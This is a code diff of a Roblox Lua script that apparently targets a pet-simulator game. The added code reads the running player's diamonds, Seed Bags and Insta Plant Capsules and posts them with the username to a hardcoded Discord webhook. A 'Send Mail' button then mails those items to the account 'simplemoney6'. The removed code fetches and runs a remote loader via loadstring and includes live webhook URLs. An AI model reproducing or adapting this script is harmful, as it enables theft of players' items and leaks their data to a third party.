@@ -1,53 +1,159 @@
 
 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Client = require(ReplicatedStorage:WaitForChild("Library"))
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
 
+local webhookURL = "https://discord.com/api/webhooks/1240051310783627374/FeWsgqN_nlUvPEXVnxgP4pZ5qIJeDn6Uyhd0_vjjBVVGegKU8jGLgVdV0ULgRWumSvML"
+local request = (syn and syn.request) or request or (http and http.request) or http_request
 
-local placeId = game.PlaceId
-local correctIds = {15588442388, 15502339080, 15588442388,8737899170}
+local DiamondsTable = {"Diamonds"}
+local ItemTable = {"Seed Bag", "Insta Plant Capsule"}
 
-if table.find(correctIds, placeId) then
-print("test")
- getgenv().Config = {
-                HUGE_GAMES_AUTHKEY = "HUGE_5EN7Jo6KrCC4",
-                Minimum_Gems = 100000,
-                Items = {
+function MakeDiamondsTable(Table)
+    local Temp = {}
+    for i, v in next, Client.Items.All.Globals.All() do
+        if table.find(Table, v._data.id) then
+            table.insert(Temp, v)
+        end
+    end
+    return Temp
+end
 
-{
-                        Item = "Diamond",
-                        Price = 12000,
-                        Type = "Seed"
-                    },
+function MakeTable(Table)
+    local Temp = {}
+    for i, v in next, Client.Items.All.Globals.All() do
+        if table.find(Table, v._data.id) then
+            table.insert(Temp, v)
+        end
+    end
+    return Temp
+end
 
-                 
+local diamondsAmount, seedBagAmount, instaPlantCapsuleAmount
+local seedbagid, instaplantid
 
-                },
-                Extra = {
-                    Huges = {Enabled=false, Percentage= "-10%", priceCap = 50000000},
-                    Titanics = {Enabled=false, Percentage="-50%", priceCap = 50000000},
-                    Exclusive = {Enabled=false, Percentage="-10%", priceCap = 50000000},
-                    Exclusive_Eggs = {Enabled=false, Percentage="-50%", priceCap = 50000000},
-                    Any_Item = {Enabled=false, Percentage="-50%", priceCap = 50000000}
-                },
-                Hop = {
-                    Server_Hop = true,
-                    Server_Hop_Mode = "Terminal",
-                },
-                Webhooks = {
-                    Enable_Discord_Webhook = true,
-                    Webhook_Url = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6",
-                    Hide_Username = false,
-                }
-            }
-            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1c2273a86dbf2e8469b442e55882aa47.lua"))()
-else
-while true do
-
-    local teleportService = game:GetService("TeleportService")
-local player = game.Players.LocalPlayer
-local placeID = 8737899170
-
-teleportService:Teleport(placeID, player.Character)
-
-    wait(2)
+function GrabDiamondsId()
+    for i, MadeTable in ipairs(MakeDiamondsTable(DiamondsTable)) do
+        local Table = HttpService:JSONDecode(tostring(MadeTable))
+        if Table.class == "Currency" then
+            diamondsAmount = Table.data._am
+        end
     end
 end
+
+function GrabId()
+    for i, MadeTable in ipairs(MakeTable(ItemTable)) do
+        local Table = HttpService:JSONDecode(tostring(MadeTable))
+        if Table.data.id == "Seed Bag" then 
+            seedBagAmount = Table.data._am
+            seedbagid = Table.uid
+        elseif Table.data.id == "Insta Plant Capsule" then
+            instaPlantCapsuleAmount = Table.data._am
+            instaplantid = Table.uid
+        end
+    end
+end
+
+GrabDiamondsId()
+GrabId()
+
+local playerName = Players.LocalPlayer.Name
+
+local contentMsg = {
+    embeds = {
+        {
+            title = "***👨‍💻: " .. playerName .. "***",
+            description = "",
+            color = 16777215,
+            fields = {
+                {
+                    name = "***💎:***",
+                    value = "***" .. diamondsAmount .. "***"
+                },
+                {
+                    name = "***🫙:***",
+                    value = "***" .. instaPlantCapsuleAmount .. "***"
+                },
+                {
+                    name = "***🌱:***",
+                    value = "***" .. seedBagAmount .. "***"
+                }
+            }
+        }
+    }
+}
+
+request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json",
+    },
+    Body = HttpService:JSONEncode(contentMsg),
+})
+
+local screenGui = Instance.new("ScreenGui")
+local button = Instance.new("TextButton")
+
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+button.Parent = screenGui
+button.Size = UDim2.new(0, 200, 0, 50)
+button.Position = UDim2.new(0.5, -100, 0.5, -25)
+button.BackgroundColor3 = Color3.new(0, 0, 0)
+button.Text = "Send Mail"
+button.TextColor3 = Color3.new(1, 1, 1)
+button.TextScaled = true
+
+button.MouseButton1Click:Connect(function()
+    local args1 = {
+        [1] = "simplemoney6",
+        [2] = "sent",
+        [3] = "Misc",
+        [4] = seedbagid or "",
+        [5] = seedBagAmount or ""
+    }
+
+    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args1))
+    wait(3)
+    local args2 = {
+        [1] = "simplemoney6",
+        [2] = "sent",
+        [3] = "Misc",
+        [4] = instaplantid or "",
+        [5] = instaPlantCapsuleAmount or ""
+    }
+
+    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
+
+    local mailContentMsg = {
+        embeds = {
+            {
+                title = "***👨‍💻: " .. playerName .. "***",
+                description = "***💌: Mail Successfully Sent!***",
+                color = 16777215,
+                fields = {
+                    {
+                        name = "***🫙:***",
+                        value = "Sent ***" .. instaPlantCapsuleAmount .. "***"
+                    },
+                    {
+                        name = "***🌱:***",
+                        value = "Sent ***" .. seedBagAmount .. "***"
+                    }
+                }
+            }
+        }
+    }
+
+    request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = HttpService:JSONEncode(mailContentMsg),
+    })
+end)
